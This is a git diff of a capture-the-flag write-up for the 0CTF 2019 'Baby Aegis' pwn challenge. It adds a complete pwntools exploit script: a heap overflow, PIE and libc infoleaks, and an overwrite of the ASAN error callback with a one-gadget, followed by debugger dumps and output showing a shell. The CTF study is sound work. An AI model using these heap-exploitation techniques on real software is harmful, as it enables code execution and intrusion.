@@ -1,6 +1,6 @@
-# This is not finished, and is still being worked on
-
 # Baby Aegis
+
+This writeup is heavily based off of: https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP#aegis
 
 When we take a look at the binary, we see this:
 
@@ -365,34 +365,177 @@ After we use the pie base and the offsets to figure out the address of a got tab
 
 ### One Gadget
 
-Now that we have the heap overflow, and the infoleaks, we can get code execution. First I just used the one gadget tool to find what gadgets there are for us to use (one gadget can be found here https://github.com/david942j/one_gadget):
-
+Now for the last part, we will have to worry about getting code execution. We will be overwriting a function pointer with a oneshot gadget (oneshot can be found here https://github.com/david942j/one_gadget). To find the available one gadgets (however not all of them might work depending on the exact conditions that they are called):
 ```
-$ one_gadget libc.so.6 
-0x3f4b6 execve("/bin/sh", rsp+0x30, environ)
+$ one_gadget libc-2.27.so 
+0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
 constraints:
-  rax == NULL
+  rcx == NULL
 
-0x3f50a execve("/bin/sh", rsp+0x30, environ)
+0x4f322 execve("/bin/sh", rsp+0x40, environ)
 constraints:
-  [rsp+0x30] == NULL
+  [rsp+0x40] == NULL
 
-0xd5a27 execve("/bin/sh", rsp+0x70, environ)
+0x10a38c  execve("/bin/sh", rsp+0x70, environ)
 constraints:
   [rsp+0x70] == NULL
 ```
 
-Now we have several one gadgets:
+Now for the overwrite, we will be overwriting the function pointer for the callback function which is called when ASAN detects certain types of issues, with that of the one gadget. Also the really cool thing about doing overwriting this versus something like a got pointer, is that the shadow memory is already set to zero as we can see (callback is at `0x5598f14c6888`, `((0x5598f14c6888 >> 3) + 0x7fff8000) = 0xab39e290d11`):
 
 ```
-gef➤  x/4g 0x55a19b099cc0
-0x55a19b099cc0: 0x602000000030  0x602000000010
-0x55a19b099cd0: 0x0 0x0
-gef➤  x/10g 0x602000000000 
-0x602000000000: 0x2ffffff00000002 0x5f00000120000010
-0x602000000010: 0x602000000030  0x55a19a1fdab0
-0x602000000020: 0x2ffffff00000002 0x5880000120000010
-0x602000000030: 0x55a19a430e30  0xbe000000deadbe00
-0x602000000040: 0x0 0x0
+gef➤  p $rdi
+$1 = 0x5598f14c6888
+gef➤  x/x 0xab39e290d11
+0xab39e290d11:  0x00000000
 ```
 
+So this write will have to parts to it. For the first part our memory will look like this:
+```
+gef➤  x/18g 0x0000602000000000
+0x602000000000: 0x02ffffff00000002  0x2300000120000010
+0x602000000010: 0x0000602000000030  0x0000563e9b6d9ab0
+0x602000000020: 0x02ffffff00000002  0x4800000120000010
+0x602000000030: 0x0000563e9b90ce30  0xbe000000deadbe00
+```
+
+We will be editing chunk `1`, which is at `0x602000000010` which will point to `0x602000000030`. We will just write the address of the callback function (this address will be a bss address, so we can calculate it using PIE infoleak):
+
+```
+gef➤  x/18g 0x0000602000000000
+0x602000000000: 0x02ffffff00000002  0x2300000120000010
+0x602000000010: 0x0000602000000030  0x0000563e9b6d9ab0
+0x602000000020: 0x02ffffff00000002  0x4800000120000010
+0x602000000030: 0x0000563e9c575888  0xbe00000000000000
+```
+
+Once we have written that address, then we can just update chunk `0` and we will be able to write to the callback function. After we write the onegadget (calculated using libc infoleak) we can just trigger an ASAN panic, and we will be able to get rce.
+
+### Exploit
+
+putting it all together, we get the following exploit:
+
+```
+# This exploit is heavily based off of: https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP#aegis
+
+from pwn import *
+
+target = process('./aegis')
+elf = ELF('aegis')
+libc = ELF('libc-2.27.so')
+gdb.attach(target)
+
+def createNote(size, payload, ide):
+  print target.recvuntil("Choice: ")
+  target.sendline('1')
+  print target.recvuntil("Size: ")
+  target.sendline(str(size))
+  print target.recvuntil("Content: ")
+  target.send(payload)
+  print target.recvuntil("ID: ")
+  target.sendline(str(ide))
+
+def showNote(index):
+        print target.recvuntil("Choice: ")
+        target.sendline('2')
+        print target.recvuntil("Index: ")
+        target.sendline(str(index))
+        content = target.recvline()
+        content = content.replace("Content: ", "")
+        content = content.replace("\x0a", "")
+        ide = target.recvline()
+        ide = ide.replace("Index: ", "")
+        ide = ide.replace("\x0a", "")
+        return content
+
+def updateNote(index, content, ide):
+        print target.recvuntil("Choice: ")
+        target.sendline("3")
+        print target.recvuntil("Index: ")
+        target.sendline(str(index))
+        print target.recvuntil("New Content: ")
+        target.send(content)
+        print target.recvuntil("New ID: ")
+        target.sendline(str(ide))
+
+def deleteNote(index):
+  print target.recvuntil("Choice: ")
+  target.sendline('4')
+  print target.recvuntil("Index: ")
+  target.sendline(str(index))
+
+
+def secret(addr):
+        print target.recvuntil("Choice: ")
+        target.sendline("666")
+        print target.recvuntil("Lucky Number: ")
+        target.sendline(str(addr))
+
+
+# Overflow heap header size
+createNote(0x10, '0'*0x8, 0xffffffffffffffff)
+secret((0x602000000020 >> 3) + 0x7fff8000)
+updateNote(0, '\x02'*0x12, 0x1502ffff00020202)
+updateNote(0, '\x02'*0x15, 0xffffffff02ffffff)
+
+# Free chunk with overflown size
+deleteNote(0)
+
+# Create a new chunk which overlaps with UAF
+createNote(0x10, p64(0x602000000018), 0xdeadbeef00)
+
+# Use heap grooming to get PIE infoleak
+pieLeak = showNote(0)
+pieLeak = u64(pieLeak + "\x00"*(8 - len(pieLeak)))
+pieBase = pieLeak - 0x114ab0
+log.info("PIE base is: " + hex(pieBase))
+
+# Use PIE infoleak to get libc infoleak via got read
+gotPuts = pieBase + elf.got['puts']
+log.info(gotPuts)
+
+updateNote(1, "0000", gotPuts >> 8)
+
+putsLeak = showNote(0)
+libcBase = u64(putsLeak + "\x00"*(8 - len(putsLeak))) - 0x43120
+log.info("libc base is: " + hex(libcBase))
+
+# Calculate needed addresses
+errorFunc = pieBase + 0xfb0888
+oneShot = libcBase + 0x10a38c
+
+# Do the callback function write using oneshot gadget, and get rce
+updateNote(1, p64(errorFunc)[:7], 0x0)
+updateNote(0, p8(0), oneShot)
+
+
+target.interactive()
+```
+
+When we run it:
+```
+$ python exploit.py 
+[+] Starting local process './aegis': pid 4163
+[*] '/Hackery/0ctf/aegis/aegis'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+    ASAN:     Enabled
+    UBSAN:    Enabled
+
+. . .
+
+[*] Switching to interactive mode
+aegis.c:144:5: runtime error: control flow integrity check for type 'int (int)' failed during indirect function call
+0xbe00000000000000: note: (unknown) defined here
+SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior aegis.c:144:5 in 
+$ w
+ 00:39:17 up 52 min,  1 user,  load average: 0.28, 0.08, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guyinatu :0       :0               23:46   ?xdm?  57.44s  0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+$ ls
+aegis  exploit.py  libc-2.27.so  old.py  solv.py
+```
